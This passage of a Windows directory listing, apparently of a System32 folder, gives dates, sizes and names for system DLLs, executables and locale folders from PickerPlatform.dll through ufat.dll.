09/15/2018  09:13 AM           274,432 PickerPlatform.dll
09/15/2018  09:13 AM            38,400 pid.dll
09/07/2019  02:20 AM           888,120 pidgenx.dll
09/15/2018  09:13 AM            35,840 pifmgr.dll
09/15/2018  09:13 AM            48,640 PimIndexMaintenanceClient.dll
09/15/2018  09:13 AM           765,952 Pimstore.dll
09/15/2018  09:12 AM            18,944 PING.EXE
09/15/2018  09:12 AM           204,288 PkgMgr.exe
09/15/2018  09:12 AM           196,096 pku2u.dll
09/15/2018  11:06 AM    <DIR>          pl-PL
09/15/2018  09:13 AM         1,534,464 pla.dll
09/15/2018  09:13 AM            61,440 playlistfolder.dll
09/15/2018  09:13 AM            80,896 PlaySndSrv.dll
09/15/2018  09:13 AM           281,088 PlayToDevice.dll
09/07/2019  02:20 AM           411,136 PlayToManager.dll
09/15/2018  09:13 AM           142,848 playtomenu.dll
09/15/2018  09:13 AM           218,112 PlayToReceiver.dll
09/15/2018  09:12 AM            29,696 PlayToStatusProvider.dll
09/15/2018  09:13 AM            58,880 pngfilt.dll
09/07/2019  02:20 AM           450,872 policymanager.dll
09/15/2018  09:12 AM           296,960 polstore.dll
09/15/2018  08:09 AM           117,248 poqexec.exe
09/15/2018  09:12 AM           518,144 PortableDeviceApi.dll
09/15/2018  09:12 AM           108,544 PortableDeviceClassExtension.dll
09/15/2018  09:12 AM            56,832 PortableDeviceConnectApi.dll
09/15/2018  09:12 AM           427,520 PortableDeviceStatus.dll
09/15/2018  09:13 AM           132,608 PortableDeviceSyncProvider.dll
09/15/2018  09:12 AM           145,408 PortableDeviceTypes.dll
09/15/2018  09:12 AM           131,072 PortableDeviceWiaCompat.dll
09/15/2018  09:13 AM            53,248 POSyncServices.dll
09/15/2018  09:13 AM            33,280 pots.dll
09/15/2018  09:13 AM           207,872 powercfg.cpl
09/15/2018  09:11 AM            80,896 powercfg.exe
09/15/2018  09:13 AM           432,128 powercpl.dll
09/15/2018  09:12 AM           341,560 powrprof.dll
08/29/2018  05:56 PM           104,560 PresentationCFFRasterizerNative_v0300.dll
09/15/2018  09:14 AM           248,832 PresentationHost.exe
09/15/2018  09:14 AM            48,640 PresentationHostProxy.dll
08/29/2018  05:56 PM           780,376 PresentationNative_v0300.dll
09/15/2018  09:13 AM            23,552 prevhost.exe
09/15/2018  09:11 AM            13,824 prflbmsg.dll
09/15/2018  09:11 AM            14,848 print.exe
09/15/2018  09:13 AM            61,952 Print.Workflow.Source.dll
09/07/2019  02:20 AM         2,865,152 PrintConfig.dll
09/15/2018  11:06 AM    <DIR>          Printing_Admin_Scripts
09/15/2018  09:13 AM            50,688 PrintPlatformConfig.dll
09/15/2018  09:13 AM         1,098,752 printui.dll
09/15/2018  09:13 AM            61,952 printui.exe
09/15/2018  09:13 AM            16,896 PrintWorkflowProxy.dll
09/07/2019  02:20 AM           139,776 PrintWorkflowService.dll
09/15/2018  09:13 AM           121,344 PrintWSDAHost.dll
09/15/2018  09:13 AM           127,488 prncache.dll
09/15/2018  09:13 AM           460,288 prnfldr.dll
09/07/2019  02:20 AM           222,720 prnntfy.dll
09/15/2018  09:13 AM           138,752 prntvpt.dll
09/15/2018  09:13 AM           106,384 profapi.dll
09/07/2019  02:20 AM           133,632 profext.dll
09/07/2019  02:20 AM         1,573,240 propsys.dll
09/15/2018  09:13 AM            30,720 proquota.exe
09/15/2018  09:12 AM           238,592 provthrd.dll
09/15/2018  09:13 AM           121,344 ProximityCommon.dll
09/15/2018  09:13 AM            14,336 ProximityCommonPal.dll
09/15/2018  09:13 AM            19,968 ProximityRtapiPal.dll
09/15/2018  09:13 AM            63,488 prvdmofcomp.dll
09/15/2018  09:11 AM            17,208 psapi.dll
09/15/2018  09:13 AM                51 pscript.sep
09/15/2018  09:11 AM            60,432 PSHED.DLL
09/15/2018  09:13 AM           485,376 psisdecd.dll
09/15/2018  09:13 AM            79,872 psisrndr.ax
09/15/2018  09:13 AM            38,912 PSModuleDiscoveryProvider.dll
09/15/2018  09:13 AM           568,320 psr.exe
09/15/2018  09:12 AM            14,336 pstorec.dll
09/15/2018  11:06 AM    <DIR>          pt-BR
09/15/2018  11:06 AM    <DIR>          pt-PT
09/15/2018  09:13 AM           172,032 puiapi.dll
09/15/2018  09:13 AM           371,712 puiobj.dll
09/15/2018  09:14 AM            70,656 pwrshplugin.dll
09/15/2018  09:11 AM            20,992 qappsrv.exe
09/15/2018  09:13 AM           128,000 qasf.dll
09/15/2018  09:13 AM           212,480 qcap.dll
09/15/2018  09:13 AM           291,840 qdv.dll
09/15/2018  09:13 AM           557,568 qdvd.dll
09/15/2018  09:13 AM           549,888 qedit.dll
09/15/2018  09:13 AM           733,696 qedwipes.dll
09/15/2018  09:11 AM            23,552 qprocess.exe
09/15/2018  09:13 AM         1,470,464 quartz.dll
09/15/2018  09:13 AM            80,896 Query.dll
09/15/2018  09:11 AM            14,336 query.exe
09/15/2018  09:11 AM            20,992 quser.exe
09/15/2018  09:13 AM           233,984 qwave.dll
09/15/2018  09:11 AM            25,088 qwinsta.exe
09/15/2018  09:13 AM            27,136 RacEngn.dll
09/15/2018  09:14 AM            91,648 radardt.dll
09/15/2018  09:13 AM            63,488 radarrs.dll
09/07/2019  02:20 AM           294,912 RADCUI.dll
09/15/2018  09:19 AM    <DIR>          ras
09/15/2018  09:13 AM            12,800 rasadhlp.dll
09/07/2019  02:20 AM           875,008 rasapi32.dll
09/15/2018  09:13 AM            15,360 rasautou.exe
09/15/2018  09:13 AM           135,168 raschap.dll
09/15/2018  09:13 AM           261,632 raschapext.dll
09/15/2018  09:13 AM             1,820 rasctrnm.h
09/15/2018  09:13 AM            19,456 rasctrs.dll
09/15/2018  09:13 AM            64,000 rasdiag.dll
09/15/2018  09:13 AM            19,456 rasdial.exe
09/15/2018  09:13 AM           865,792 rasdlg.dll
09/15/2018  09:13 AM           849,920 rasgcw.dll
09/07/2019  02:20 AM           156,672 rasman.dll
09/15/2018  09:13 AM           301,568 rasmontr.dll
09/15/2018  09:13 AM            31,744 rasphone.exe
09/15/2018  09:13 AM           460,288 rasplap.dll
09/07/2019  02:20 AM           284,160 rasppp.dll
09/15/2018  09:13 AM            21,504 rassfm.dll
09/07/2019  02:20 AM           242,176 rastapi.dll
09/07/2019  02:20 AM           463,872 rastls.dll
09/15/2018  09:13 AM           331,776 rastlsext.dll
09/15/2018  09:19 AM    <DIR>          RasToast
09/15/2018  09:13 AM           181,248 rasuser.dll
09/15/2018  09:14 AM            20,480 RdmsInst.dll
09/15/2018  09:14 AM             2,560 rdmsres.dll
09/07/2019  02:20 AM         1,222,160 rdpbase.dll
09/07/2019  02:20 AM         1,075,712 rdpcore.dll
09/15/2018  09:13 AM           348,672 rdpencom.dll
09/15/2018  09:13 AM           267,496 rdpendp.dll
09/07/2019  02:21 AM           316,928 rdpinit.exe
09/15/2018  09:13 AM            38,400 RdpSa.exe
09/15/2018  09:13 AM            24,064 RdpSaProxy.exe
09/15/2018  09:13 AM            11,776 RdpSaPs.dll
09/15/2018  09:13 AM            26,112 RdpSaUacHelper.exe
09/07/2019  02:20 AM         1,590,064 rdpserverbase.dll
09/07/2019  02:21 AM           393,728 rdpshell.exe
09/15/2018  09:11 AM            74,240 rdpsign.exe
09/15/2018  09:12 AM            41,984 rdrleakdiag.exe
09/15/2018  09:13 AM           186,368 rdvgocl32.dll
09/15/2018  09:13 AM           684,544 rdvgogl32.dll
09/15/2018  09:13 AM           146,432 rdvgu1132.dll
09/15/2018  09:13 AM            96,256 rdvgumd32.dll
09/15/2018  09:11 AM            65,536 rdvvmtransport.dll
09/07/2019  02:20 AM           918,032 ReAgent.dll
09/15/2018  09:13 AM            35,328 ReAgentc.exe
09/15/2018  09:11 AM            12,288 recover.exe
09/15/2018  09:19 AM    <DIR>          Recovery
09/15/2018  09:11 AM            59,392 reg.exe
09/15/2018  09:11 AM            82,944 regapi.dll
09/15/2018  09:13 AM            41,984 RegCtrl.dll
09/07/2019  02:20 AM           329,216 regedit.exe
09/15/2018  09:13 AM            10,240 regedt32.exe
09/15/2018  09:13 AM            41,472 regini.exe
09/15/2018  09:13 AM            20,480 Register-CimProvider.exe
09/15/2018  09:12 AM            20,992 regsvr32.exe
09/15/2018  09:13 AM            30,432 reguwpapi.dll
09/15/2018  09:13 AM           152,064 ReInfo.dll
09/15/2018  09:13 AM           115,200 rekeywiz.exe
09/15/2018  09:12 AM            45,568 relog.exe
09/15/2018  09:13 AM            73,024 remoteaudioendpoint.dll
09/15/2018  09:13 AM           203,776 remotepg.dll
09/15/2018  09:13 AM            87,040 remotesp.tsp
09/15/2018  09:13 AM            55,808 RemoveDeviceContextHandler.dll
09/15/2018  09:13 AM            10,752 RemoveDeviceElevated.dll
09/15/2018  09:11 AM            18,944 replace.exe
09/15/2018  09:12 AM           232,904 RESAMPLEDMO.DLL
09/15/2018  09:11 AM            14,848 reset.exe
09/15/2018  09:13 AM           109,056 resmon.exe
09/15/2018  09:13 AM            49,560 ResourcePolicyClient.dll
09/15/2018  09:11 AM               714 RestartManager.mof
09/15/2018  09:11 AM               176 RestartManagerUninstall.mof
09/07/2019  02:20 AM           480,256 resutils.dll
09/07/2019  02:20 AM            32,768 rfxvmt.dll
09/15/2018  09:13 AM           150,528 rgb9rast.dll
09/15/2018  09:12 AM           496,640 riched20.dll
09/15/2018  09:12 AM             8,192 riched32.dll
09/15/2018  09:13 AM           540,672 RMActivate.exe
09/15/2018  09:13 AM           557,568 RMActivate_isv.exe
09/15/2018  09:13 AM           479,232 RMActivate_ssp.exe
09/15/2018  09:13 AM           479,744 RMActivate_ssp_isv.exe
09/07/2019  02:20 AM           114,128 rmclient.dll
09/15/2018  09:11 AM            15,360 RmClient.exe
09/15/2018  09:13 AM             2,048 rnr20.dll
09/15/2018  11:06 AM    <DIR>          ro-RO
09/15/2018  09:11 AM           103,936 Robocopy.exe
09/15/2018  09:13 AM           171,400 rometadata.dll
09/15/2018  09:12 AM            19,456 ROUTE.EXE
09/15/2018  09:11 AM           151,552 rpchttp.dll
09/15/2018  09:11 AM             8,704 RpcNs4.dll
09/15/2018  09:11 AM            27,648 rpcnsh.dll
09/07/2019  02:20 AM            26,624 RpcPing.exe
09/07/2019  02:20 AM           782,968 rpcrt4.dll
09/15/2018  09:11 AM            51,640 RpcRtRemote.dll
09/15/2018  09:12 AM            37,888 rrinstaller.exe
09/15/2018  09:12 AM           185,608 rsaenh.dll
09/15/2018  09:13 AM           117,760 rshx32.dll
09/15/2018  09:13 AM            43,566 rsop.msc
09/15/2018  09:13 AM            80,896 rsopprov.exe
09/15/2018  09:11 AM           198,656 RstrtMgr.dll
09/15/2018  09:13 AM            36,864 rtffilt.dll
09/15/2018  09:13 AM           162,304 rtm.dll
09/15/2018  09:13 AM           920,520 rtmcodecs.dll
09/15/2018  09:13 AM           348,672 RTMediaFrame.dll
09/15/2018  09:13 AM            58,312 rtmmvrortc.dll
09/15/2018  09:13 AM           995,272 rtmpal.dll
09/15/2018  09:13 AM         3,895,752 rtmpltfm.dll
09/15/2018  09:13 AM            68,608 rtrfiltr.dll
09/15/2018  09:12 AM            52,224 rtutils.dll
09/15/2018  09:13 AM           155,664 RTWorkQ.dll
09/15/2018  11:06 AM    <DIR>          ru-RU
09/15/2018  09:11 AM            17,920 runas.exe
09/15/2018  09:13 AM            61,952 rundll32.exe
09/15/2018  09:13 AM            67,584 RunLegacyCPLElevated.exe
09/15/2018  09:12 AM            47,104 runonce.exe
09/15/2018  09:11 AM            19,456 rwinsta.exe
09/15/2018  09:12 AM            70,144 samcli.dll
09/15/2018  09:12 AM            84,480 samlib.dll
09/15/2018  09:13 AM             9,728 sas.dll
09/15/2018  09:13 AM           731,136 sbe.dll
09/15/2018  09:13 AM           148,480 sbeio.dll
09/15/2018  09:13 AM            66,048 sberes.dll
09/15/2018  09:11 AM            60,928 sc.exe
09/15/2018  09:13 AM           244,224 scansetting.dll
09/15/2018  09:13 AM            67,072 SCardDlg.dll
09/15/2018  09:12 AM           214,016 scecli.dll
09/15/2018  09:13 AM           384,000 scesrv.dll
09/07/2019  02:20 AM           447,488 schannel.dll
09/15/2018  09:12 AM            19,968 schedcli.dll
09/15/2018  09:12 AM           190,976 schtasks.exe
09/15/2018  09:13 AM           236,032 scksp.dll
09/15/2018  09:13 AM            35,328 scrdenrl.dll
09/15/2018  09:11 AM            42,148 SCregEdit.wsf
09/15/2018  09:13 AM            70,144 scripto.dll
09/15/2018  09:12 AM            28,672 scrnsave.scr
09/15/2018  09:13 AM           207,872 scrobj.dll
09/15/2018  09:13 AM           466,432 scrptadm.dll
09/07/2019  02:20 AM           165,376 scrrun.dll
09/15/2018  09:11 AM            20,992 sdbinst.exe
09/07/2019  02:21 AM           220,672 SDClient.dll
09/15/2018  09:13 AM           183,296 sdiageng.dll
09/15/2018  09:13 AM            21,504 sdiagnhost.exe
09/15/2018  09:13 AM           149,504 sdiagprv.dll
09/15/2018  09:13 AM           402,944 sdohlp.dll
09/07/2019  02:20 AM           284,672 Search.ProtocolHandler.MAPI2.dll
09/15/2018  09:13 AM           211,968 SearchFilterHost.exe
09/15/2018  09:13 AM           324,096 SearchFolder.dll
09/07/2019  02:20 AM           882,688 SearchIndexer.exe
09/07/2019  02:20 AM           349,184 SearchProtocolHost.exe
09/15/2018  09:12 AM            37,888 SecEdit.exe
09/15/2018  09:12 AM           492,432 sechost.dll
09/15/2018  09:13 AM             9,216 secinit.exe
09/15/2018  09:13 AM           347,648 secproc.dll
09/15/2018  09:13 AM           346,112 secproc_isv.dll
09/15/2018  09:13 AM            88,064 secproc_ssp.dll
09/15/2018  09:13 AM            88,576 secproc_ssp_isv.dll
09/15/2018  09:12 AM            23,040 secur32.dll
09/15/2018  09:12 AM             4,608 security.dll
09/15/2018  09:13 AM             5,783 SecurityAndMaintenance.png
09/15/2018  09:13 AM             2,613 SecurityAndMaintenance_Alert.png
09/15/2018  09:13 AM             6,873 SecurityAndMaintenance_Error.png
09/15/2018  09:13 AM            22,528 SEMgrPS.dll
09/15/2018  09:13 AM           121,856 sendmail.dll
09/15/2018  09:11 AM            11,264 SensApi.dll
09/07/2019  02:20 AM           312,832 SensorsApi.dll
09/15/2018  09:13 AM             2,560 SensorsCpl.dll
09/15/2018  09:13 AM            56,800 SensorsNativeApi.dll
09/15/2018  09:13 AM           119,288 SensorsNativeApi.V2.dll
09/15/2018  09:13 AM            88,280 SensorsUtilsV2.dll
09/15/2018  09:13 AM            15,360 serialui.dll
09/15/2018  09:13 AM            92,746 services.msc
09/15/2018  09:13 AM            18,944 serwvdrv.dll
09/15/2018  09:11 AM           409,088 SessEnv.dll
09/15/2018  09:13 AM           279,040 sethc.exe
09/15/2018  09:12 AM            24,064 setspn.exe
09/07/2019  02:20 AM           964,608 SettingSyncCore.dll
09/07/2019  02:20 AM           828,728 SettingSyncHost.exe
09/15/2018  11:06 AM    <DIR>          setup
09/15/2018  09:11 AM            26,112 setup16.exe
09/07/2019  02:20 AM         4,527,624 setupapi.dll
09/07/2019  02:20 AM           104,960 setupcln.dll
09/15/2018  09:11 AM           117,760 setupugc.exe
09/15/2018  09:11 AM            46,592 setx.exe
09/15/2018  09:13 AM             2,560 sfc.dll
09/15/2018  09:11 AM            35,840 sfc.exe
09/15/2018  09:13 AM            41,984 sfc_os.dll
09/15/2018  09:13 AM           111,616 shacct.dll
09/15/2018  09:13 AM            58,368 shacctprofile.dll
09/07/2019  02:20 AM           845,824 ShareHost.dll
09/15/2018  09:12 AM           555,440 SHCore.dll
09/15/2018  09:13 AM           217,600 shdocvw.dll
09/07/2019  02:20 AM         5,597,808 shell32.dll
09/07/2019  02:20 AM           253,952 ShellCommonCommonProxyStub.dll
09/15/2018  09:12 AM             8,704 shfolder.dll
09/15/2018  09:13 AM            23,552 shgina.dll
09/15/2018  09:13 AM            16,740 ShiftJIS.uce
09/15/2018  09:11 AM             5,632 shimeng.dll
09/15/2018  09:13 AM            26,624 shimgvw.dll
09/15/2018  09:12 AM           274,224 shlwapi.dll
09/15/2018  09:13 AM            16,896 shpafact.dll
09/15/2018  09:13 AM           392,704 shrpubw.exe
09/15/2018  09:12 AM           108,032 shsetup.dll
09/15/2018  09:13 AM           566,784 shsvcs.dll
09/07/2019  02:20 AM            21,504 shunimpl.dll
09/15/2018  09:12 AM            23,552 shutdown.exe
09/15/2018  09:13 AM            25,088 shutdownext.dll
09/15/2018  09:13 AM           431,616 shwebsvc.dll
09/15/2018  09:11 AM            42,496 signdrv.dll
09/15/2018  09:13 AM           126,464 SimAuth.dll
09/15/2018  09:13 AM            82,944 SimCfg.dll
09/15/2018  09:13 AM             8,192 simpdata.tlb
09/15/2018  11:06 AM    <DIR>          sk-SK
09/15/2018  11:06 AM    <DIR>          sl-SI
09/15/2018  09:13 AM           122,368 slc.dll
09/07/2019  02:20 AM            19,968 slcext.dll
09/15/2018  11:06 AM    <DIR>          slmgr
09/15/2018  09:12 AM           142,904 slmgr.vbs
09/15/2018  09:12 AM            72,704 slwga.dll
09/07/2019  02:20 AM           640,512 SmartcardCredentialProvider.dll
09/07/2019  02:20 AM           132,096 smartscreenps.dll
09/15/2018  09:13 AM            84,480 SMBHelperClass.dll
09/15/2018  09:19 AM    <DIR>          SMI
09/15/2018  09:11 AM            20,992 smphost.dll
09/15/2018  09:13 AM           224,288 SndVol.exe
09/07/2019  02:20 AM           775,168 SndVolSSO.dll
09/15/2018  09:12 AM            25,600 snmpapi.dll
09/15/2018  09:13 AM           108,032 socialapis.dll
09/15/2018  09:12 AM           130,560 softkbd.dll
09/15/2018  09:13 AM            10,240 softpub.dll
09/15/2018  09:11 AM            24,576 sort.exe
09/15/2018  09:13 AM            39,936 SortServer2003Compat.dll
09/15/2018  09:13 AM            42,496 SortWindows61.dll
09/15/2018  09:13 AM            61,440 SortWindows6Compat.dll
09/07/2019  02:20 AM           165,376 spacebridge.dll
09/07/2019  02:20 AM           144,896 SpatialAudioLicenseSrv.exe
09/15/2018  09:13 AM           198,656 SpatializerApo.dll
09/15/2018  09:11 AM            82,944 spbcd.dll
09/15/2018  09:19 AM    <DIR>          Speech
09/15/2018  09:19 AM    <DIR>          Speech_OneCore
09/15/2018  09:11 AM            87,040 spfileq.dll
09/15/2018  09:11 AM            83,968 spinf.dll
09/15/2018  09:11 AM             9,216 spnet.dll
09/07/2019  02:20 AM           129,024 spopk.dll
09/15/2018  09:19 AM    <DIR>          spp
09/15/2018  09:13 AM           102,912 sppc.dll
09/07/2019  02:20 AM           485,376 sppcext.dll
09/15/2018  09:13 AM           401,920 sppcomapi.dll
09/15/2018  09:13 AM            36,368 sppinst.dll
09/15/2018  09:19 AM    <DIR>          sppui
09/15/2018  09:13 AM           114,688 sppwmi.dll
09/15/2018  09:13 AM            12,288 spwinsat.dll
09/15/2018  09:11 AM           407,552 spwizeng.dll
09/15/2018  09:11 AM         5,865,272 spwizimg.dll
09/15/2018  09:11 AM         5,928,448 spwizimg_svr.dll
09/15/2018  09:11 AM            16,696 spwizres.dll
09/15/2018  11:06 AM             9,216 spwmp.dll
09/15/2018  09:13 AM           114,688 sqlcecompact40.dll
09/15/2018  09:13 AM           169,472 sqlceoledb40.dll
09/15/2018  09:13 AM           705,536 sqlceqp40.dll
09/15/2018  09:13 AM           414,208 sqlcese40.dll
01/06/2018  08:30 AM         3,008,176 sqlncli11.dll
09/24/2019  02:37 PM            26,289 SQLServerManager15.msc
09/15/2018  09:12 AM           666,112 sqlsrv32.dll
09/15/2018  09:12 AM            94,208 sqlsrv32.rll
09/15/2018  09:12 AM           188,768 sqlunirl.dll
09/15/2018  09:12 AM            17,760 sqlwid.dll
09/15/2018  09:12 AM            43,872 sqlwoa.dll
09/15/2018  09:13 AM            40,432 sqmapi.dll
09/15/2018  11:06 AM    <DIR>          sr-Latn-RS
09/15/2018  09:13 AM           332,800 srchadmin.dll
09/15/2018  11:08 AM           279,040 srm.dll
09/15/2018  11:08 AM           960,000 srmclient.dll
09/15/2018  11:08 AM            90,112 srmlib.dll
09/15/2018  11:08 AM           477,696 srmscan.dll
09/15/2018  11:08 AM           124,928 srmshell.dll
09/15/2018  11:08 AM           197,632 srmstormod.dll
09/15/2018  11:08 AM            66,048 srmtrace.dll
09/15/2018  11:08 AM            16,896 srm_ps.dll
09/07/2019  02:20 AM           126,976 srpapi.dll
09/15/2018  09:13 AM           304,128 SrpUxNativeSnapIn.dll
09/15/2018  09:12 AM            74,352 srvcli.dll
09/15/2018  09:12 AM            36,352 sscore.dll
09/15/2018  09:13 AM           327,168 ssdm.dll
09/15/2018  09:13 AM            48,640 ssdpapi.dll
09/15/2018  09:13 AM           122,400 sspicli.dll
09/15/2018  09:12 AM           111,416 SSShim.dll
09/15/2018  09:13 AM            19,456 Startupscan.dll
09/07/2019  02:20 AM           540,720 StateRepository.Core.dll
09/15/2018  09:13 AM            53,760 stclient.dll
09/15/2018  09:11 AM            18,432 stdole2.tlb
09/15/2018  09:11 AM             7,168 stdole32.tlb
09/15/2018  09:13 AM           228,352 sti.dll
09/15/2018  09:13 AM           378,880 stobject.dll
09/15/2018  09:13 AM             8,960 storage.dll
09/15/2018  09:13 AM            79,872 StorageContextHandler.dll
09/07/2019  02:20 AM         2,013,696 storagewmi.dll
09/15/2018  09:11 AM            20,480 storagewmi_passthru.dll
09/15/2018  09:13 AM            92,672 stordiag.exe
09/15/2018  09:13 AM            57,856 Storprop.dll
09/07/2019  02:20 AM           540,240 StructuredQuery.dll
09/15/2018  09:13 AM            93,702 SubRange.uce
09/15/2018  09:11 AM            14,848 subst.exe
09/15/2018  09:13 AM           642,560 sud.dll
09/15/2018  11:06 AM    <DIR>          sv-SE
09/15/2018  09:12 AM            45,448 svchost.exe
09/15/2018  09:13 AM           543,352 sxs.dll
09/15/2018  09:11 AM            19,456 sxshared.dll
09/15/2018  09:11 AM            23,552 sxsstore.dll
09/15/2018  09:13 AM            29,696 sxstrace.exe
09/15/2018  09:13 AM         3,274,240 SyncCenter.dll
09/15/2018  09:13 AM            38,400 SyncHost.exe
09/15/2018  09:13 AM            10,752 SyncHostps.dll
09/15/2018  09:13 AM           345,088 SyncInfrastructure.dll
09/15/2018  09:13 AM            17,408 SyncInfrastructureps.dll
09/15/2018  09:13 AM            61,952 Syncreg.dll
09/15/2018  09:13 AM           315,904 sysdm.cpl
09/15/2018  09:13 AM           423,936 sysmon.ocx
09/15/2018  11:06 AM    <DIR>          sysprep
09/15/2018  09:13 AM             3,317 sysprint.sep
09/15/2018  09:13 AM             3,666 sysprtj.sep
09/15/2018  09:11 AM            15,360 syssetup.dll
09/15/2018  09:13 AM           287,744 systemcpl.dll
09/15/2018  09:13 AM            22,528 SystemEventsBrokerClient.dll
09/15/2018  09:12 AM            76,800 systeminfo.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesAdvanced.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesComputerName.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesDataExecutionPrevention.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesHardware.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesPerformance.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesProtection.exe
09/15/2018  09:13 AM            82,944 SystemPropertiesRemote.exe
09/15/2018  09:13 AM            42,496 SystemSupportInfo.dll
09/15/2018  09:13 AM            64,512 SystemUWPLauncher.exe
09/15/2018  09:13 AM             9,728 systray.exe
09/07/2019  02:20 AM           138,752 t2embed.dll
09/15/2018  09:11 AM            52,224 takeown.exe
09/15/2018  09:13 AM           851,456 tapi3.dll
09/15/2018  09:13 AM           193,536 tapi32.dll
09/15/2018  09:14 AM            41,761 tapimgmt.msc
09/15/2018  09:13 AM            51,200 TapiMigPlugin.dll
09/15/2018  09:13 AM             9,728 tapiperf.dll
09/15/2018  09:14 AM           301,056 tapisnap.dll
09/15/2018  09:13 AM           252,928 tapisrv.dll
09/15/2018  09:13 AM            10,240 TapiSysprep.dll
09/15/2018  09:13 AM           109,056 tapiui.dll
09/15/2018  09:13 AM            12,800 TapiUnattend.exe
09/15/2018  09:13 AM            43,520 tar.exe
09/15/2018  09:13 AM           297,472 TaskApis.dll
09/07/2019  02:20 AM           362,496 taskcomp.dll
09/15/2018  09:12 AM            74,240 taskkill.exe
09/15/2018  09:12 AM            79,360 tasklist.exe
09/07/2019  02:20 AM         1,278,808 Taskmgr.exe
09/15/2018  09:19 AM    <DIR>          Tasks
09/15/2018  09:13 AM           535,600 taskschd.dll
09/15/2018  09:13 AM           145,059 taskschd.msc
09/15/2018  09:12 AM            36,864 TaskSchdPS.dll
09/15/2018  09:13 AM            49,152 tbauth.dll
09/15/2018  09:11 AM            42,576 tbs.dll
09/15/2018  09:13 AM            14,848 tcmsetup.exe
09/15/2018  09:13 AM             1,673 tcpbidi.xml
09/15/2018  09:13 AM           175,616 tcpipcfg.dll
09/15/2018  09:13 AM            31,744 tcpmib.dll
09/15/2018  09:14 AM           180,224 tcpmon.dll
09/15/2018  09:14 AM            60,124 tcpmon.ini
09/15/2018  09:13 AM            58,368 tcpmonui.dll
09/15/2018  09:12 AM            10,240 TCPSVCS.EXE
09/15/2018  09:13 AM            72,704 tdc.ocx
09/07/2019  02:20 AM           626,176 tdh.dll
09/15/2018  09:13 AM           107,520 telephon.cpl
09/15/2018  09:13 AM            73,728 TempSignedLicenseExchangeTask.dll
09/15/2018  09:13 AM           361,472 termmgr.dll
09/15/2018  09:13 AM            66,048 tetheringclient.dll
09/15/2018  09:13 AM           542,504 TextInputFramework.dll
09/07/2019  02:22 AM    <DIR>          th-TH
09/15/2018  09:13 AM         2,457,600 themecpl.dll
09/07/2019  02:20 AM         2,832,896 themeui.dll
09/15/2018  09:13 AM            58,368 threadpoolwinrt.dll
09/07/2019  02:20 AM           312,632 thumbcache.dll
09/15/2018  09:13 AM            28,672 ThumbnailExtractionHost.exe
09/07/2019  02:20 AM           434,176 TileDataRepository.dll
09/15/2018  09:12 AM           462,336 timedate.cpl
09/15/2018  09:13 AM             9,216 TimeDateMUICallback.dll
09/15/2018  09:11 AM            25,088 timeout.exe
09/15/2018  09:14 AM           137,216 TlsBrand.dll
09/15/2018  09:11 AM            35,840 tlscsp.dll
09/15/2018  09:14 AM            23,903 tls_branding_config.xml
09/15/2018  09:12 AM            34,304 tokenbinding.dll
09/07/2019  02:20 AM         1,257,472 TokenBroker.dll
09/15/2018  09:13 AM            29,184 TokenBrokerCookies.exe
09/07/2019  02:20 AM            54,272 TokenBrokerUI.dll
09/15/2018  09:13 AM           144,862 tpm.msc
09/15/2018  09:13 AM             3,584 TpmCertResources.dll
09/15/2018  09:13 AM            41,984 tpmcompc.dll
09/15/2018  09:13 AM           702,976 TpmCoreProvisioning.dll
09/15/2018  09:13 AM            62,976 TpmInit.exe
09/07/2019  02:20 AM         2,765,312 tquery.dll
09/15/2018  11:06 AM    <DIR>          tr-TR
09/15/2018  09:12 AM           376,832 tracerpt.exe
09/15/2018  09:12 AM            15,360 TRACERT.EXE
09/15/2018  09:13 AM            35,328 traffic.dll
09/15/2018  09:11 AM            17,920 tree.com
09/15/2018  09:13 AM            88,064 TrustedSignalCredProv.dll
09/15/2018  09:13 AM            13,312 tsbyuv.dll
09/15/2018  09:11 AM           177,152 tscfgwmi.dll
09/15/2018  09:11 AM            19,968 tscon.exe
09/15/2018  09:11 AM            20,480 tsdiscon.exe
09/15/2018  09:14 AM            11,264 tsec.dll
09/15/2018  09:14 AM            28,672 tsecimp.exe
09/15/2018  09:13 AM            50,688 tsgqec.dll
09/15/2018  09:11 AM            20,992 tskill.exe
09/07/2019  02:20 AM           349,144 tsmf.dll
09/15/2018  09:13 AM           121,344 TSpkg.dll
09/15/2018  09:14 AM            37,888 tsprop.dll
09/15/2018  09:14 AM            77,312 tsPubIconHelper.dll
09/15/2018  09:11 AM           189,952 tspubwmi.dll
09/15/2018  09:11 AM            98,304 tssdjet.dll
09/15/2018  09:13 AM            45,056 TSTheme.exe
09/15/2018  09:13 AM           134,144 tsuserex.dll
09/07/2019  02:20 AM           976,896 TSWorkspace.dll
08/29/2018  05:56 PM            36,896 TsWpfWrp.exe
09/15/2018  09:13 AM           156,952 ttdinject.exe
09/15/2018  09:13 AM            14,960 ttdloader.dll
09/15/2018  09:13 AM            14,960 ttdloaderwow64.dll
09/15/2018  09:13 AM            54,584 ttdplm.dll
09/15/2018  09:13 AM           114,648 ttdrecord.dll
09/07/2019  02:20 AM         1,272,560 ttdrecordcpu.dll
09/07/2019  02:20 AM           272,648 ttdwriter.dll
09/15/2018  09:13 AM           195,584 TtlsAuth.dll
09/15/2018  09:13 AM           163,840 TtlsCfg.dll
09/15/2018  09:13 AM           191,504 tttracer.exe
09/15/2018  09:13 AM            30,720 tvratings.dll
09/15/2018  09:13 AM           154,112 twext.dll
09/07/2019  02:20 AM         1,720,936 twinapi.appcore.dll
09/15/2018  09:13 AM           499,200 twinapi.dll
09/15/2018  09:13 AM           651,264 twinui.appcore.dll
09/07/2019  02:20 AM         5,764,608 twinui.dll
09/15/2018  09:13 AM            95,744 txflog.dll
09/15/2018  09:11 AM            11,776 txfw32.dll
09/15/2018  09:13 AM             8,960 typelib.dll
09/15/2018  09:12 AM            41,984 typeperf.exe
09/15/2018  09:13 AM            73,728 tzautoupdate.dll
09/07/2019  02:20 AM             2,560 tzres.dll
09/15/2018  09:11 AM            48,128 tzutil.exe
09/15/2018  09:13 AM            78,336 ualapi.dll
09/15/2018  09:13 AM            49,664 ucmhc.dll
09/07/2019  02:20 AM         1,191,512 ucrtbase.dll
09/15/2018  09:13 AM            58,368 udhisapi.dll
09/15/2018  09:13 AM             3,420 UevCustomActionTypes.tlb
09/15/2018  09:13 AM           104,960 uexfat.dll
09/15/2018  09:11 AM           139,264 ufat.dll
